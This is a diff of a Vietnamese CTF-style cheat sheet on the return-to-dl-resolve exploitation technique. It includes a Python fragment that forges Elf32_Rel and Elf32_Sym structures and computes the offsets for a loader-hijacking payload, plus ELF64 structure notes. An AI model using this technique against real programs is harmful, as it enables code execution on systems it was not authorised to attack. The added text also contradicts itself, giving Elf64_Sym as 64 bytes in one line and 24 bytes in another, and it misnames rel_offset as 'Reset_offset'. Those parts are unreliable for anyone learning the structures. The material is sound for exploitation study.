@@ -162,15 +162,16 @@ _dl_runtime_resolve(link_map, rel_offset) {
 Để khai thác cần tính toán, lựa chọn vị trí và align phức tạp nữa nên một lần nữa tôi nhấn mạnh đây chỉ giống như `cheat sheet` => đọc và làm ví dụ từ writeup `0ctf - babystack` tôi để link trong mẫu 32 bit.
 
 ```python
+### FAKE INFO 
 # Compute offsets and forged structures
 forged_ara = buf + 0x14				                  # buffer2 contain struct from buf + 0x14
 
-# fake rel_offset argument `_dl_runtime_resolve`
-rel_offset = forged_ara - JMPREL		
-elf32_sym = forged_ara + 0x8	                     # size of elf32_sym
-
+elf32_sym = forged_ara + 0x8	                     # size of elf32_rel
 align = 0x10 - ((elf32_sym - SYMTAB) % 0x10) 	   # align to 0x10
 elf32_sym = elf32_sym + align
+
+# fake rel_offset argument `_dl_runtime_resolve`
+rel_offset = forged_ara - JMPREL		
 
 # fake rel_entry->r_info 
 index_sym = (elf32_sym - SYMTAB) // 0x10
@@ -179,6 +180,7 @@ r_info = (index_sym << 8) | 0x7
 # fake st_name (sym_entry->st_name)
 st_name = (elf32_sym + 0x10) - STRTAB
 
+### FAKE STRUCT
 # fake struct "Elf32_Rel *rel_entry"
 fake_rel_struct = p32(elf.got["read"]) + p32(r_info)
 
@@ -196,6 +198,8 @@ fake_sym_struct += p32(0) + p32(0x12)
 [+] https://www.lazenca.net/display/TEC/01.Return-to-dl-resolve+-+x86
 
 ## 2) 64 bit.
+
+Cấu trúc Elf64_Rela có kích thước 24 byte.
 
 ```c
 typedef uint64_t Elf64_Addr;
@@ -215,6 +219,8 @@ typedef struct
 /* val = Elf64_Rela->r_info */
 ```
 
+Cấu trúc Elf64_Sym có kích thước 64 byte.
+
 ```c
 typedef uint32_t Elf64_Word;
 typedef uint16_t Elf64_Section;
@@ -231,6 +237,12 @@ typedef struct
   Elf64_Xword     st_size;                /* Symbol size */ 8
 } Elf64_Sym;
 ```
+
+      - Sự khác biệt giữa x86 và x64 là cấu trúc Elf64_Rela, Elf64_Sym được sử dụng thay vì cấu trúc Elf32_Rel, Elf32_Sym.
+      - Điều quan trọng ở đây là kích thước của cấu trúc thay đổi.
+         - Kích thước của cấu trúc Elf32_Rel (8 byte) → Kích thước của cấu trúc Elf64_Rela (24 byte)
+         - Kích thước của cấu trúc Elf32_Sym (16 byte)  →  Kích thước của cấu trúc Elf64_Sym (24 byte)
+         - Do đó, giá trị Reset_offset phải là chỉ số mảng của cấu trúc Elf64_Rela, không phải là giá trị bù đắp của địa chỉ.
 
 ```c
 const struct r_found_version *version = NULL;
